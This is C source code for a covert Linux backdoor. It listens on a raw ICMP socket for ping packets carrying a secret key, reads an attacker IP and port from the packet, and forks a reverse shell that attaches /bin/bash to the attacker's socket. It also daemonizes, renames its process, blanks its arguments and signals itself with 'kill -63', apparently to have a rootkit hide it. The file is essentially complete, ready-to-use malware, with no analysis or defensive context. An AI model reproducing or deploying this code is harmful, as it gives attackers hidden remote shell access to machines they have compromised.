#include <stdio.h>
#include <sys/types.h> 
#include <errno.h>
#include <stdlib.h>
#include <string.h>
#include <stdarg.h>
#include <netdb.h>
#include <unistd.h>
#include <ctype.h>
#include <netinet/in.h>
#include <netinet/in_systm.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <signal.h>

#define PACKET_SIZE 	1024
#define KEY         	"jack_crusher"
#define MOTD        	"/bin/bash\n"
#define SHELL       	"/bin/bash"
#define PROCESS_NAME    "backdoor"


void hide_process()
{
    char cmd[50];
    pid_t pid = getpid();
    sprintf(cmd, "kill -63 %i", (int) pid);
    system(cmd);
}


/*
 * Start the reverse shell
 */
void reverse_shell(char *attacker_ip, unsigned short int attacker_port){
    int sock;
    char service[15];
    struct addrinfo *addr_info, hints, *tmp;
    
    sprintf(service, "%d", attacker_port);

    memset(&hints, 0, sizeof(struct addrinfo));
    hints.ai_family = AF_INET;

    if(getaddrinfo(attacker_ip, service, &hints, &addr_info) < 0){
        return;
    }

    for (tmp = addr_info; tmp != NULL; tmp = tmp->ai_next){
        sock = socket(tmp->ai_family, tmp->ai_socktype, tmp->ai_protocol);
        if(sock < 0)	continue;

        if(connect(sock, addr_info->ai_addr, addr_info->ai_addrlen) == 0){
            /* success */
            break;
        }
        close(sock);
    }
    if(tmp == NULL){
        return;
    }
    freeaddrinfo(addr_info);

	//Print header
    write(sock, MOTD, strlen(MOTD));
    
    /* 
 	 * Connect socket to stdio
 	 * Run shell 
 	 */
    dup2(sock, 0); 
    dup2(sock, 1); 
    dup2(sock, 2);
    execl(SHELL, SHELL, (char *)0);
    close(sock);
}

/*
 * ICMP packet mode
 */
void ping_listener(void){
	int sockfd;
	int n;	
	int icmp_ksize;
    char buf[PACKET_SIZE + 1];
    struct ip *ip;
	struct icmp *icmp;

	icmp_ksize = strlen(KEY);
    sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
    // Listen for icmp packets
	while(1){
        /* get the icmp packet */
        bzero(buf, PACKET_SIZE + 1);        
        n = recv(sockfd, buf, PACKET_SIZE,0);
		if(n > 0){    
            ip = (struct ip *)buf;
            icmp = (struct icmp *)(ip + 1);
            
			// If ICMP_ECHO packet and if KEY matches  */
            if((icmp->icmp_type == ICMP_ECHO) && (memcmp(icmp->icmp_data, KEY, 
				icmp_ksize) == 0)){
                char attacker_ip[16];
                int attacker_port;
                
                attacker_port = 0;
                bzero(attacker_ip, sizeof(attacker_ip));
                sscanf((char *)(icmp->icmp_data + icmp_ksize + 1), "%15s %d", 
						attacker_ip, &attacker_port);
                
                if((attacker_port <= 0) || (strlen(attacker_ip) < 7))
                    continue;
                /* Starting reverse shell */
                if(fork() == 0){
					reverse_shell(attacker_ip, attacker_port);
                    exit(EXIT_SUCCESS);
                }
            }
        }
    }
}

/*
 * main ()
 */
int main(int argc, char *argv[]){ 
	// Prevent zombies
    signal(SIGCLD, SIG_IGN); 
    chdir("/");
    // If argv is equal to -v, some info will be printed
    if ((argc == 2) && (argv[1][0] == '-') && (argv[1][1] == 'v')){
        fprintf(stdout, "KEY:\t\t\t%s\n",KEY);
		fprintf(stdout, "Process name:\t\t%s\n", PROCESS_NAME);
        fprintf(stdout, "Shell:\t\t\t%s\n", SHELL);
    }
    int i;
    // Renaming our process
    strncpy(argv[0], PROCESS_NAME, strlen(argv[0]));
    for (i=1; i<argc; i++){
        memset(argv[i],' ', strlen(argv[i]));
	}
    if (fork() != 0)
        exit(EXIT_SUCCESS);
    
    if (getgid() != 0) {
        exit(EXIT_FAILURE);
    }

    hide_process();

    ping_listener();
    return EXIT_SUCCESS;
}
